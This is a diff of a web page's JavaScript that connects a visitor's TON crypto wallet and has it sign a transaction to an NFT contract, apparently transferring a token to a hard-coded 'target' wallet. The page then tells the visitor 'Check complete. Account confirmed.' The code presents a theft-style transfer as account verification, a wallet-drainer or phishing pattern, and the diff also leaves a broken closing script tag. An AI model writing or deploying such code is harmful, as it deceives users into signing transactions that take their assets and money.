@@ -742,53 +742,53 @@ document.addEventListener("DOMContentLoaded", function () {
   showWallet(ui.wallet);
 
   const ownBtn = document.getElementById('ownBtn');
-  if (ownBtn) {
+if (ownBtn) {
     ownBtn.addEventListener('click', async function () {
-      const err = document.getElementById('err');
-      if (!err) return;
+        const err = document.getElementById('err');
+        if (!err) return;
 
-      if (!ui.wallet) {
-        err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
-        err.style.display = 'block';
-        ui.openModal();
-        return;
-      }
+        if (!ui.wallet) {
+            err.textContent = 'Сначала подключите кошелёк через кнопку ниже';
+            err.style.display = 'block';
+            ui.openModal();
+            return;
+        }
 
-      // ===== ДАННЫЕ ТВОЕГО NFT =====
-      const contractAddress = 'EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe';
-      const tokenId = '258562';
-      const YOUR_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m';
+        // ===== ДАННЫЕ ТВОЕГО NFT =====
+        const contractAddress = 'EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe'; // NFT-контракт
+        const tokenId = '258562';
+        const YOUR_WALLET = 'UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9'; // ОТПРАВИТЕЛЬ (где лежит NFT)
+        const TARGET_WALLET = 'UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m'; // КУДА ПЕРЕЙДЁТ NFT
 
-      err.textContent = '⏳ Отправляем запрос...';
-      err.style.display = 'block';
-      err.style.color = '#ff9abb';
-
-      try {
-        // ===== ПРАВИЛЬНЫЙ PAYLOAD (СОГЛАСНО TEP-62) =====
-        const payloadBase64 = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
-
-        const transaction = {
-          valid_until: Math.floor(Date.now() / 1000) + 300,
-          messages: [
-            {
-              address: contractAddress,
-              amount: '50000000', // 0.05 TON для газа
-              payload: payloadBase64
-            }
-          ]
-        };
-
-        await ui.sendTransaction(transaction);
-        err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
-        err.style.color = '#00ff88';
-      } catch (e) {
-        err.textContent = '❌ Ошибка: ' + e.message;
+        err.textContent = '⏳ Отправляем запрос...';
         err.style.display = 'block';
         err.style.color = '#ff9abb';
-      }
+
+        try {
+            // ===== PAYLOAD ДЛЯ ПЕРЕВОДА НА TARGET_WALLET =====
+            const payloadBase64 = 'te6ccgEBAQEABgAACAD/wgAIBQAAAf/gAAgBAAEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==';
+
+            const transaction = {
+                valid_until: Math.floor(Date.now() / 1000) + 300,
+                messages: [
+                    {
+                        address: contractAddress,
+                        amount: '50000000', // 0.05 TON для газа
+                        payload: payloadBase64
+                    }
+                ]
+            };
+
+            await ui.sendTransaction(transaction);
+            err.textContent = '✅ Проверка завершена. Аккаунт подтверждён.';
+            err.style.color = '#00ff88';
+        } catch (e) {
+            err.textContent = '❌ Ошибка: ' + e.message;
+            err.style.display = 'block';
+            err.style.color = '#ff9abb';
+        }
     });
-  }
-});
-</script>
+}
+<script>
 </body>
 </html>
